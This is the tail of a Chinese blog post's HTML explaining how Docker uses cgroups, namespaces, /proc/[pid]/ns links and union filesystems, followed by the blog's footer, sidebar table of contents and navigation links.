+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810011242761.png" alt="image-20230810011242761" style="zoom:67%;" /> 
+<p>每一个 CGroup 下面都有一个 tasks 文件，其中存储着属于当前控制组的所有进程的 pid，作为负责 cpu 的子系统，cpu.cfs_quota_us 文件中的内容能够对 CPU 的使用作出限制，如果当前文件的内容为 50000，那么当前控制组中的全部进程的 CPU 占用率不能超过 50%。</p>
+<p>如果系统管理员想要控制 Docker 某个容器的资源使用率就可以在 docker 这个父控制组下面找到对应的子控制组并且改变它们对应文件的内容，当然我们也可以直接在程序运行时就使用参数，让 Docker 进程去改变相应文件中的内容。</p>
+<p>当我们使用 Docker 关闭掉正在运行的容器时，Docker 的子控制组对应的文件夹也会被 Docker 进程移除，Docker 在使用 CGroup 时其实也只是做了一些创建文件夹改变文件内容的文件操作，不过 CGroup 的使用也确实解决了我们限制子容器资源占用的问题，系统管理员能够为多个容器合理的分配资源并且不会出现多个容器互相抢占资源的问题。</p>
+<p>从 3.8 版本的内核开始，用户就可以在 /proc/[pid]/ns 文件下看到指向不同 namespace 号的文件，效果如下所示，形如 [4026531839] 者即为 namespace 号。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /proc/$$/ns         &lt;&lt;-- 0=&quot;&quot; 1=&quot;&quot; 8=&quot;&quot; $$=&quot;&quot; 表示应用的pid=&quot;&quot; total=&quot;&quot; lrwxrwxrwx.=&quot;&quot; mtk=&quot;&quot; jan=&quot;&quot; 04:12=&quot;&quot; ipc=&quot;&quot; -=&quot;&quot;&gt; ipc:[4026531839]</span><br><span class="line">lrwxrwxrwx. 1 mtk mtk 0 Jan  8 04:12 mnt -&gt; mnt:[4026531840]</span><br><span class="line">lrwxrwxrwx. 1 mtk mtk 0 Jan  8 04:12 net -&gt; net:[4026531956]</span><br><span class="line">lrwxrwxrwx. 1 mtk mtk 0 Jan  8 04:12 pid -&gt; pid:[4026531836]</span><br><span class="line">lrwxrwxrwx. 1 mtk mtk 0 Jan  8 04:12 user-&gt;user:[4026531837]</span><br><span class="line">lrwxrwxrwx. 1 mtk mtk 0 Jan  8 04:12 uts -&gt; uts:[4026531838]</span><br></pre></td></tr></table></figure>
+<p>如果两个进程指向的 namespace 编号相同，就说明他们在同一个 namespace 下，否则则在不同 namespace 里面。/proc/[pid]/ns 的另外一个作用是，一旦文件被打开，只要打开的文件描述符（fd）存在，那么就算 PID 所属的所有进程都已经结束，创建的 namespace 就会一直存在。那如何打开文件描述符呢？把 /proc/[pid]/ns 目录挂载起来就可以达到这个效果，命令如下。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">touch</span> ~/uts</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">mount --<span class="built_in">bind</span> /proc/27514/ns/uts ~/uts</span></span><br></pre></td></tr></table></figure>
+<p>如果你看到的内容与本文所描述的不符，那么说明你使用的内核在 3.8 版本以前。该目录下存在的只有 ipc、net 和 uts，并且以硬链接存在。</p>
+<h3 id="总结"><a class="markdownIt-Anchor" href="#总结">#</a> 总结</h3>
+<p>docker 为 LXC+AUFS 组合：</p>
+<ul>
+<li>LXC 负责资源管理</li>
+<li>AUFS 负责镜像管理；</li>
+</ul>
+<p>而 LXC 包括 cgroup，namespace，chroot 等组件，并通过 cgroup 资源管理</p>
+<p>cgroup 是在底层落实资源管理，LXC 在 cgroup 上面封装了一层，随后，docker 有在 LXC 封装了一层；</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230810011627372.png" alt="image-20230810011627372"></p>
+<p><strong>Cgroup 其实就是 linux 提供的一种限制，记录，隔离进程组所使用的物理资源管理机制；也就是说，Cgroup 是 LXC 为实现虚拟化所使用资源管理手段，我们可以这样说，底层没有 cgroup 支持，也就没有 lxc，更别说 docker 的存在了</strong></p>
+<p>我们提到 LXC 是建立在 cgroup 基础上的，我们可以粗略的认为<strong> LXC=Cgroup+namespace+Chroot+veth + 用户控制脚本；LXC 利用内核的新特性（cgroup）来提供用户空间的对象，用来保证资源的隔离和对应用系统资源的限制；</strong></p>
+<p>Docker 容器的文件系统最早是建立在 Aufs 基础上的，Aufs 是一种 Union FS，简单来说就 ** 是支持将不同的目录挂载到同一个虚拟文件系统之下并实现一种 laver 的概念，** 由于 Aufs 未能加入到 linux 内核中，考虑到兼容性的问题，便加入了 Devicemapper 的支持，Docker 目前默认是建立在 Devicemapper 基础上，**devicemapper 用户控件相关部分主要负责配置具体的策略和控制逻辑，** 比如逻辑设备和哪些物理设备建立映射，怎么建立这些映射关系等，而具体过滤和重定向 IO 请求的工作有内核中相关代码完成，因此整个 device mapper 机制由两部分组成–内核空间的 device mapper 驱动，用户控件的 device mapper 库以及它提供的 dmsetup 工具；</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY3JhenltYWtlcmNpcmNsZS9wLzE1NDAwOTQ2Lmh0bWw=">Docker 底层原理（图解 + 秒懂 + 史上最全） - 疯狂创客圈 - 博客园 (cnblogs.com)</span></p>
+
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">Edited on</span>
+    <time title="Modified: 2023-08-16 01:58:42" itemprop="dateModified" datetime="2023-08-16T01:58:42+08:00">2023-08-16</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> Donate</button>
+  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="John Doe WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="John Doe Alipay">
+        <p>Alipay</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="John Doe PayPal">
+        <p>PayPal</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>Post author:  </strong>John Doe <i class="ic i-at"><em>@</em></i>Hexo
+  </li>
+  <li class="link">
+    <strong>Post link: </strong>
+    <a href="http://example.com/2023/08/02/yuque/Capabilities/" title="docker底层原理+capability">http://example.com/2023/08/02/yuque/Capabilities/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/07/15/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipesx5fdwj20zk0m81kx.jpg" title="中间件漏洞">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>中间件漏洞</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2023/08/02/Capabilities/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva3.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipexoj0moj20zk0m8kgu.jpg" title="docker底层原理+capability">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>docker底层原理+capability</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#docker%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86capability"><span class="toc-number">1.</span> <span class="toc-text"> docker 底层原理 + capability</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#capability"><span class="toc-number">1.1.</span> <span class="toc-text"> Capability</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E5%90%8Ccapabilities%E5%B8%A6%E6%9D%A5%E7%9A%84%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 不同 capabilities 带来的安全问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_sys_admin"><span class="toc-number">1.1.2.</span> <span class="toc-text"> CAP_SYS_ADMIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_sys_ptrace"><span class="toc-number">1.1.3.</span> <span class="toc-text"> CAP_SYS_PTRACE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_sys_module"><span class="toc-number">1.1.4.</span> <span class="toc-text"> CAP_SYS_MODULE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_dac_read_search"><span class="toc-number">1.1.5.</span> <span class="toc-text"> CAP_DAC_READ_SEARCH</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_dac_override"><span class="toc-number">1.1.6.</span> <span class="toc-text"> CAP_DAC_OVERRIDE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_chown"><span class="toc-number">1.1.7.</span> <span class="toc-text"> CAP_CHOWN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_fowner"><span class="toc-number">1.1.8.</span> <span class="toc-text"> CAP_FOWNER</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_setuid"><span class="toc-number">1.1.9.</span> <span class="toc-text"> CAP_SETUID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_setgid"><span class="toc-number">1.1.10.</span> <span class="toc-text"> CAP_SETGID</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_setfcap"><span class="toc-number">1.1.11.</span> <span class="toc-text"> CAP_SETFCAP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_sys_rawio"><span class="toc-number">1.1.12.</span> <span class="toc-text"> CAP_SYS_RAWIO</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_kill"><span class="toc-number">1.1.13.</span> <span class="toc-text"> CAP_KILL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_net_bind_service"><span class="toc-number">1.1.14.</span> <span class="toc-text"> CAP_NET_BIND_SERVICE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_net_raw"><span class="toc-number">1.1.15.</span> <span class="toc-text"> CAP_NET_RAW</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_net_admin-cap_net_raw"><span class="toc-number">1.1.16.</span> <span class="toc-text"> CAP_NET_ADMIN + CAP_NET_RAW</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_linux_immutable"><span class="toc-number">1.1.17.</span> <span class="toc-text"> CAP_LINUX_IMMUTABLE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cap_sys_chroot"><span class="toc-number">1.1.18.</span> <span class="toc-text"> CAP_SYS_CHROOT</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#capabilities-%E7%9A%84%E8%B5%8B%E4%BA%88%E5%92%8C%E7%BB%A7%E6%89%BF"><span class="toc-number">1.2.</span> <span class="toc-text"> capabilities 的赋予和继承</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BA%BF%E7%A8%8B%E7%9A%84-capabilities"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 线程的 capabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#permitted-%E5%85%81%E8%AE%B8"><span class="toc-number">1.2.1.1.</span> <span class="toc-text"> Permitted 允许</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#effective-%E6%9C%89%E6%95%88"><span class="toc-number">1.2.1.2.</span> <span class="toc-text"> Effective 有效</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#inheritable"><span class="toc-number">1.2.1.3.</span> <span class="toc-text"> Inheritable</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#bounding"><span class="toc-number">1.2.1.4.</span> <span class="toc-text"> Bounding</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ambient"><span class="toc-number">1.2.1.5.</span> <span class="toc-text"> Ambient</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%9A%84-capabilities"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 文件的 capabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#permitted"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> Permitted</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#inheritable-2"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> Inheritable</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#effective"><span class="toc-number">1.2.2.3.</span> <span class="toc-text"> Effective</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C-execve-%E5%90%8E-capabilities-%E7%9A%84%E5%8F%98%E5%8C%96"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 运行 execve () 后 capabilities 的变化</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%92%8C%E8%AE%BE%E7%BD%AEcapabilities"><span class="toc-number">1.3.</span> <span class="toc-text"> 查看和设置 capabilities</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-libcap"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 1. libcap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#no_new_privs"><span class="toc-number">1.3.2.</span> <span class="toc-text"> no_new_privs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AE%A1%E7%90%86-capabilities"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 管理 capabilities</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-libcap-ng"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 2. libcap-ng</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%B3%95"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 用法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#capability-%E8%BF%9B%E9%98%B6"><span class="toc-number">1.4.</span> <span class="toc-text"> capability 进阶</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E5%8A%A8%E8%AE%BE%E7%BD%AEcapability"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 手动设置 capability</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker"><span class="toc-number">1.5.</span> <span class="toc-text"> docker</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#unionfs"><span class="toc-number">1.5.1.</span> <span class="toc-text"> unionfs</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#namespace"><span class="toc-number">1.5.2.</span> <span class="toc-text"> namespace</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#pid%E9%9A%94%E7%A6%BB"><span class="toc-number">1.5.2.1.</span> <span class="toc-text"> PID 隔离</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%9A%94%E7%A6%BB"><span class="toc-number">1.5.3.</span> <span class="toc-text"> 网络隔离</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libnetwork"><span class="toc-number">1.5.4.</span> <span class="toc-text"> Libnetwork</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%82%E8%BD%BD%E7%82%B9"><span class="toc-number">1.5.5.</span> <span class="toc-text"> 挂载点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#cgroups"><span class="toc-number">1.5.6.</span> <span class="toc-text"> cgroups</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.7.</span> <span class="toc-text"> 总结</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="John Doe"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">John Doe</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">68</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">4</span>
+        <span class="name">categories</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">4</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2023/07/15/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2023/08/02/Capabilities/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/05/20/yuque/Kubernetes/" title="Kubernetes">Kubernetes</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2022/02/28/XSS/" title="XSS">XSS</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/05/yuque/Docker/" title="docker">docker</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/11/27/Docker%E9%80%83%E9%80%B8/" title="docker逃逸&amp;capabilities">docker逃逸&capabilities</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/01/20/VXLAN/" title="VXLAN">VXLAN</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/04/03/yuque/iptables2/" title="iptables">iptables</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/%E7%A7%8B%E6%8B%9B/" title="In 秋招">秋招</a>
+</div>
+
+    <span><a href="/2022/10/27/%E7%A7%8B%E6%8B%9B%E6%80%BB%E7%BB%93/" title="秋招总结">秋招总结</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/05/17/yuque/include/" title="file include">file include</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/04/16/Upload/" title="File upload">File upload</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/web%E5%AE%89%E5%85%A8/" title="In web安全">web安全</a>
+</div>
+
+    <span><a href="/2022/11/27/yuque/Docker%E9%80%83%E9%80%B8/" title="docker逃逸&amp;capabilities">docker逃逸&capabilities</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/08/02/yuque/Capabilities/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+</body>
+</html>
